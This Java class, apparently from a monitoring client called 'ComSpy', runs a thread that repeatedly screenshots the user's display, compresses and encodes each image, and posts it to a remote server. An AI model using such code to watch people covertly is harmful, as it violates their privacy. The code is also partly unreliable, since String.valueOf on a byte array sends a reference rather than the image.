/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package screencaptcher;

import Comman.LOCAL_KEYS;
import Comman.SERVER_KEYS;
import Comman.Tool;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import org.apache.commons.net.util.Base64;

/**
 *
 * @author abaza
 */
public class Screen extends Thread {
    
    Robot robot = null;
    Rectangle rectangle = null;
    boolean continueLoop = false;
    long Sleep;
    String ServerUUID, ClientUUID, Today;
    Comman.Tool cTool = null;
    OutputStream OutStrem;
    compy_client.ComSpy ComSpy = null;
    SERVER_KEYS Server_Var = new SERVER_KEYS();
    LOCAL_KEYS Local_Var = new LOCAL_KEYS();
    
    public Screen(long Sleep, Robot robot, Rectangle rect, String ServerUUID, String ClientUUID, compy_client.ComSpy ComSpy) {
        this.ComSpy = ComSpy;
        this.robot = robot;
        this.rectangle = rect;
        this.ServerUUID = ServerUUID;
        this.ClientUUID = ClientUUID;
        this.Sleep = Sleep;
        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");
        Calendar cal = Calendar.getInstance();
        cTool = new Comman.Tool();
        Today = dateFormat.format(cal.getTime());
        this.go();
    }
    
    @Override
    public void run() {
        while (continueLoop) {
            try {
                BufferedImage image = robot.createScreenCapture(rectangle);
                File temp = File.createTempFile("imtemps", ".tmp");
                OutStrem = new FileOutputStream(temp);
                ImageIO.write(image, "JPEG", OutStrem);
                Thread.sleep(400);
                
                OutStrem.flush();
                image.flush();
                byte[] bFile = new byte[(int) temp.length()];
                try (FileInputStream fileInputStream = new FileInputStream(temp)) {
                    fileInputStream.read(bFile);
                }
                this.SaveinDB(bFile);
                image.flush();
                OutStrem.flush();
                OutStrem.close();
                image = null;
                Thread.sleep(Sleep - 400);
                temp.delete();
            } catch (IOException ex) {
                System.err.println("ERROR SCREEN : " + ex.getMessage());
            } catch (InterruptedException ex) {
                Logger.getLogger(Screen.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
    }
    
    private void SaveinDB(byte[] bFile) {
        byte[] bImage = cTool.Image_compress(bFile);
        String imageDataString = Tool.encodeImage(bImage);
        byte[] IMAGE = cTool.String_compress(imageDataString);
        String[][] Buff = {
            {Server_Var.TYPE_COMMENT, Server_Var.SC_PRINT},
            {Local_Var.SCREEN_SUUID, ServerUUID},
            {Local_Var.SCREEN_CUUID, ClientUUID},
            {Local_Var.SCREEN_DATE_REC, Today},
            {Local_Var.SCREEN_SCREEN, String.valueOf(IMAGE)},
            {Local_Var.SCREEN_ISDONE, "0"}
        };
        
        this.ComSpy.Server.ContanerPOST(Buff);
    }

    /**
     * Encodes the byte array into base64 string
     *
     * @param imageByteArray - byte array
     * @return String a {@link java.lang.String}
     */
    public static String encodeImage(byte[] imageByteArray) {
        return Base64.encodeBase64URLSafeString(imageByteArray);
    }
    
    public void go() {
        if (!this.continueLoop) {
            this.continueLoop = true;
            this.setName("ScreenShot");
            this.start();
        }
    }
    
    public void end() {
        if (this.continueLoop) {
            this.continueLoop = false;
//            this.SC_DB = null;
            this.OutStrem = null;
            this.stop();
        }
    }
}
